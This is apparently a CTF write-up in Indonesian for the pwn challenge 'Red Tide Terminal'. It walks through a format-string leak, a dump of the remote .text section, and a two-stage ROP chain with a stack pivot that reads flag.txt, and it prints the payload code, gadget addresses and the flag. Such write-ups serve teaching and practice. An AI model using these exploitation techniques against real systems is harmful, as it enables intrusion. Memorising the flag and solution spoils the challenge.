# Red Tide Terminal

**Category:** Pwn  
**CTF:** Grodno / JuniorCrypt  
**Flag:** `grodno{5a79c6e9-4588-432b-99be-d69d1deb3648}`

## Ringkasan

Service menerima codename lalu sebuah packet dengan panjang maksimum `0xf0`. Ada dua bug:

1. `printf(user_input)` pada bagian codename, sehingga input menjadi format string.
2. `read(0, buffer, length)` membaca sampai `0xf0` byte ke buffer stack berukuran `0x60`.

Attachment lokal dan service remote ternyata berbeda build. Attachment memakai PIE dan stack canary, sedangkan fungsi `route_packet` pada remote memakai alamat kode tetap dan tidak melakukan pengecekan canary. Karena itu exploit awal yang memakai offset attachment gagal. Setelah `.text` remote didump lewat format string, gadget dan layout stack yang benar dapat dipakai untuk ROP dua tahap.

Stage pertama memanggil `read(0, 0x404300, 0x400)` lalu melakukan stack pivot ke `.bss`. Stage kedua menjalankan syscall `openat`, `read`, dan `write` untuk mencetak `flag.txt`.

---

## 1. Recon attachment

```bash
file red_tide_terminal
readelf -h red_tide_terminal
readelf -W -l red_tide_terminal
readelf -d red_tide_terminal
readelf -Ws red_tide_terminal | grep stack_chk
```

Hasil attachment lokal:

```text
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
Type: DYN (Position-Independent Executable file)
GNU_STACK: RW
GNU_RELRO: present
FLAGS: BIND_NOW
FLAGS_1: NOW PIE
__stack_chk_fail@GLIBC_2.4
```

Artinya attachment memiliki:

- Full RELRO
- NX
- PIE
- Stack canary
- Symbol dan debug info masih tersedia

Program hanya meminta dua input:

```text
Codename:
AUDIT: ...
Packet length:
Packet data:
Packet queued.
```

---

## 2. Format string pada codename

Disassembly attachment memperlihatkan pola berikut di `log_identity`:

```asm
lea    rax,[rbp-0x90]
mov    rdi,rax
mov    eax,0
call   printf@plt
```

Buffer codename dipakai langsung sebagai format string. Leak awal dilakukan dengan positional specifier:

```text
%17$p|%18$p|...|%29$p
```

Output remote:

```text
%17$p=0x7fffcebe15f8
%20$p=0x403e00
%21$p=0x7e1061c54000
%22$p=0x7fffcebe14d0
%23$p=0x40159a
%25$p=0x7e1061a301ca
%29$p=0x401579
```

Nilai `0x40159a` dan `0x401579` merupakan alamat kode tetap. Ini bertentangan dengan attachment PIE yang seharusnya berada pada base acak seperti `0x55...`.

Percobaan awal menganggap `%23$p` sebagai canary attachment. Validasi byte bawah langsung menunjukkan asumsi itu salah:

```text
[-] exploit gagal: nilai canary tidak valid: 0x40159a
```

Ini bukan sekadar index format string yang bergeser. Remote memakai build berbeda.

---

## 3. Dump `.text` remote

Format string dapat dinaikkan menjadi arbitrary read dengan `%N$s`. Pointer target diletakkan di dalam buffer input dan dipanggil memakai positional argument.

Konsep payload:

```python
PTR_OFFSET = 0x70
PTR_INDEX = 6 + PTR_OFFSET // 8

fmt = b"QSTARTQ" + f"%{PTR_INDEX}$.64s".encode() + b"QENDQ"
payload = (fmt + b"\x00").ljust(PTR_OFFSET, b"A")
payload += p64(address)
```

Karena alamat kode sudah diketahui berada di sekitar `0x401xxx`, range `0x401300` sampai `0x4015c0` didump per chunk. Byte hasil dump disimpan sebagai `remote_text.bin`, lalu dicari opcode gadget sederhana.

```text
[+] pop rdi ; ret   : 0x4013ec
[+] pop rsi ; ret   : 0x4013f5
[+] pop rdx ; ret   : 0x4013fe
[+] pop rax ; ret   : 0x401407
[+] syscall ; ret   : 0x401410
[+] leave ; ret     : 0x4013e6, 0x4014ba, 0x40151a, 0x401577
```

Alamat gadget attachment sebelumnya berada di offset berbeda, jadi chain lama memang tidak mungkin berjalan di remote.

---

## 4. Analisis `route_packet` remote

Bagian penting hasil disassembly remote:

```asm
401520: push   rbp
401521: mov    rbp,rsp
401524: sub    rsp,0x60
...
40153a: cmp    DWORD PTR [rbp-0x4],0xf0
401541: jbe    0x40154f
...
401559: mov    edx,DWORD PTR [rbp-0x4]
40155c: lea    rax,[rbp-0x60]
401560: mov    rsi,rax
401563: mov    edi,0
401568: call   read
...
401577: leave
401578: ret
```

Layout stack:

```text
rbp-0x60  buffer[0x60]
rbp       saved RBP
rbp+0x08  saved RIP
```

Offset dari awal buffer:

```text
saved RBP = 0x60
saved RIP = 0x68
```

Program menerima panjang sampai `0xf0`, sehingga tersedia overflow maksimum:

```text
0xf0 - 0x60 = 0x90 byte
```

Tidak ada pembacaan `fs:0x28` atau call ke `__stack_chk_fail` pada `route_packet` remote. Slot canary dummy yang dipakai pada exploit lama justru menggeser seluruh ROP chain delapan byte.

---

## 5. Stage 1 — baca chain kedua ke `.bss`

Alamat `.bss` yang dipakai:

```python
STAGE2_ADDR = 0x404300
```

Stage pertama menimpa saved RBP dengan `0x404300`, lalu saved RIP dengan ROP chain:

```python
payload  = b"A" * 0x60
payload += p64(0x404300)       # saved RBP
payload += flat([
    0x4013ec, 0,              # pop rdi ; ret -> stdin
    0x4013f5, 0x404300,       # pop rsi ; ret -> destination
    0x4013fe, 0x400,          # pop rdx ; ret -> size
    0x401407, 0,              # pop rax ; ret -> SYS_read
    0x401410,                 # syscall ; ret
    0x4013e6,                 # leave ; ret
])
```

Panjang stage pertama adalah `0xb8`, masih di bawah batas packet `0xf0`.

Syscall yang dijalankan:

```c
read(0, 0x404300, 0x400);
```

Setelah `read`, gadget `leave; ret` memakai saved RBP yang telah dikontrol:

```text
RBP = 0x404300
RSP = 0x404308
RIP = *(0x404308)
```

Dengan begitu eksekusi berpindah ke chain kedua di `.bss`.

---

## 6. Stage 2 — ORW `flag.txt`

Stage kedua menyimpan chain mulai dari `0x404300`. Qword pertama dipakai sebagai RBP baru oleh `leave`, sehingga gadget pertama berada di `0x404308`.

Path diletakkan pada:

```python
path_addr = 0x404300 + 0x300
```

Buffer hasil baca file:

```python
io_addr = 0x404300 + 0x500
```

Chain ORW:

### `openat`

```c
openat(AT_FDCWD, "flag.txt", O_RDONLY, 0);
```

Register syscall:

```text
rax = 257
rdi = -100
rsi = path_addr
rdx = 0
```

### `read`

File descriptor hasil `openat` adalah `3` pada service ini karena descriptor `0`, `1`, dan `2` sudah dipakai stdio.

```c
read(3, io_addr, 0x100);
```

### `write`

```c
write(1, io_addr, 0x100);
```

Chain diakhiri dengan:

```c
exit(0);
```

---

## 7. Sinkronisasi dua stage

Stage 1 dan stage 2 dikirim dalam satu `sendall`:

```python
sock.sendall(stage1 + stage2)
```

`route_packet` memanggil:

```c
read(0, stack_buffer, len(stage1));
```

Karena jumlah yang diminta tepat sepanjang stage 1, byte stage 2 tetap berada di receive queue socket. Setelah fungsi return ke ROP, syscall pertama mengambil sisa data tersebut:

```c
read(0, 0x404300, 0x400);
```

Cara ini menghindari race antara output `Packet queued.` dan permintaan stage kedua.

---

## 8. Menjalankan exploit

```bash
python3 solve.py 10.112.0.12 45000
```

Output:

```text
[*] mencoba path: flag.txt
<FLAG>grodno{5a79c6e9-4588-432b-99be-d69d1deb3648}</FLAG>
```

## Flag

```text
grodno{5a79c6e9-4588-432b-99be-d69d1deb3648}
```
